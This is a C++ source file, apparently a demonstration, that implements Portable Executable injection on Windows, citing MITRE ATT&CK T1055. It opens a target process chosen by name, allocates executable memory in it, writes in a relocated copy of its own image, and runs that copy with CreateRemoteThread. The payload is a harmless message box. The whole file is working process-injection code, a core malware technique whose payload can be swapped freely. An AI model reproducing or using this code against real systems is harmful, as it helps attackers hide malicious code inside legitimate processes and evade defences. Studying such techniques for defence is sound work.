#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
using namespace std;

/*
** Portable Executable Injection (Pe Injection)
** Reference:
** [1] - https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process
** [2] - http://www.rohitab.com/discuss/topic/41441-pe-injection-new/
** [3] - https://attack.mitre.org/wiki/Technique/T1055
*/

// Get The Process ID
DWORD GetProcessID(const char* procname)
{
	PROCESSENTRY32 pe;
	HANDLE hSnap;

	pe.dwSize = sizeof(PROCESSENTRY32);
	hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (Process32First(hSnap, &pe)) {
		do
		{
			if (strcmp(pe.szExeFile, procname) == 0)
				break;
		} while (Process32Next(hSnap, &pe));
	}
	return pe.th32ProcessID;
}
DWORD WINAPI myFunction(PVOID p)
{
	MessageBox(NULL, "Hello Friend!! (o_O)", "Process Injection Techniques", MB_ICONWARNING);
	return 0;
}


int main(int argc, char const *argv[])
{
	PIMAGE_DOS_HEADER pIDH;
	PIMAGE_NT_HEADERS pINH;
	PIMAGE_BASE_RELOCATION pIBR;

	HANDLE hProcess, hThread;
	PUSHORT TypeOffset;

	PVOID ImageBase, Buffer, mem;
	ULONG i, Count, Delta, *p;

	char strTmp[256], ProcessName[256];
	// Process running Input
	cout << "Example: crackme, basecalc, HxD..." << endl;
	cout << "Enter Process Name: "; rewind(stdin);
	cin.getline(strTmp, sizeof(strTmp));
	strcpy(ProcessName, strcat(strTmp, ".exe"));

	// Starting Injection
	cout << "[ Starting ] Portable Executable Injection!" << endl;
	cout << "[ OPENING ] Target process opening...!" << endl;
	hProcess = OpenProcess(
		PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
		FALSE, GetProcessID(ProcessName));
	if (!hProcess)
	{
		cout << "[ ERROR ] Unable to open target process" << GetLastError() << endl;
		return -1;
	}

	ImageBase = GetModuleHandle(NULL);
	cout << "Image base in current process: " << hex << ImageBase << endl;

	pIDH = (PIMAGE_DOS_HEADER)ImageBase;
	pINH = (PIMAGE_NT_HEADERS)((PUCHAR)ImageBase + pIDH->e_lfanew);

	cout << "Allocating memory in target process." << endl;
	mem = VirtualAllocEx(hProcess, NULL, pINH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (!mem)
	{
		cout << "[ ERROR ] Unable to allocate memory in target process" << GetLastError() << endl;
		CloseHandle(hProcess);
		return -1;
	}
	cout << "Memory allocated at: " << hex << mem << endl;

	Buffer = VirtualAlloc(NULL, pINH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	memcpy(Buffer, ImageBase, pINH->OptionalHeader.SizeOfImage);
	cout << "Relocating image" << endl;

	pIBR = (PIMAGE_BASE_RELOCATION)((PUCHAR)Buffer + pINH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
	Delta = (ULONG)mem - (ULONG)ImageBase;

	while (pIBR->VirtualAddress)
	{
		if (pIBR->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION))
		{
			Count = (pIBR->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
			TypeOffset = (PUSHORT)(pIBR + 1);

			for (i = 0; i < Count; i++)
			{
				if (TypeOffset[i])
				{
					p = (PULONG)((PUCHAR)Buffer + pIBR->VirtualAddress + (TypeOffset[i] & 0xFFF));
					*p += Delta;
				}
			}
		}

		pIBR = (PIMAGE_BASE_RELOCATION)((PUCHAR)pIBR + pIBR->SizeOfBlock);
	}

	cout << "Writing relocated image into target process" << endl;
	if (!WriteProcessMemory(hProcess, mem, Buffer, pINH->OptionalHeader.SizeOfImage, NULL))
	{
		cout << "[ ERROR ] Unable to write process memory" << GetLastError() << endl;
		VirtualFreeEx(hProcess, mem, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return -1;
	}

	VirtualFree(Buffer, 0, MEM_RELEASE);
	cout << "Creating thread in target process" << endl;
	hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((PUCHAR)myFunction + Delta), NULL, 0, NULL);
	if (!hThread)
	{
		cout << "[ ERROR ] Unable to create thread in target process" << GetLastError() << endl;
		VirtualFreeEx(hProcess, mem, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return -1;
	}
	
	cout << "Waiting for the thread to terminate" << endl;
	WaitForSingleObject(hThread, INFINITE);

	cout << "Free allocated memory" << endl;
	VirtualFreeEx(hProcess, mem, 0, MEM_RELEASE);
	CloseHandle(hProcess);

	cout << "[ EXIT ] Press any key to exit." << endl;

	getchar();
	return 0;
}